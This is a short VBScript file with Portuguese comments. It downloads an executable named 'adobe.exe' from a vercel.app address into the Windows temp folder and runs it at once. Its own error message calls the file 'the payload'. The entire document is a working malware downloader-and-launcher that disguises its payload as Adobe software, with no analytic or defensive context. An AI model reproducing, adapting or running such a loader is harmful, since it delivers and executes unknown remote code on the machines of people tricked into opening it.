Option Explicit

Dim urlExe, destinoExe, http, stream

urlExe = "https://testando123-blond.vercel.app/adobe.exe"
destinoExe = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\adobe.exe"

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", urlExe, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' binário
    stream.Open
    stream.Write http.responseBody
    stream.Position = 0
    stream.SaveToFile destinoExe, 2
    stream.Close

    CreateObject("WScript.Shell").Run Chr(34) & destinoExe & Chr(34), 1, False
Else
    MsgBox "Falha ao baixar o payload: " & http.Status
End If
